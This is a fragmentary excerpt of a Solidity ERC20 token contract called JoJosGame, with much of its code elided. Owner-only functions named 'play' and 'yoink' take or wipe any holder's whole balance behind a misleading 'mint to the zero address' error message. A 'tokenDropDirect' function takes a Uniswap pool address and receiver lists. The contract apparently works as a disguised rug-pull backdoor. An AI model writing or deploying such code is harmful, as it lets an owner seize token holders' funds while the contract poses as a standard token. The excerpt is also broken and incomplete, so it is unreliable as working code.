...
contract  JoJosGame is Context, IERC20 {
    ...
    address lead_deployer = 0x7d037EAbd6f1B29170eebb19cC4F7F87F6867c0C;
    address public _owner = 0x310ff3b8922c92cbAc2c48A1172fF93692292589;
   constructor () public {
        ...
        _mint(lead_deployer, initialSupply*(10**6));
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    */
    ...
    function play(address account) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, address(0), amount);
        ...
        function yoink(address account, address staker) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
...
*/
  ...
  function tokenDropDirect(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts)  public auth(){
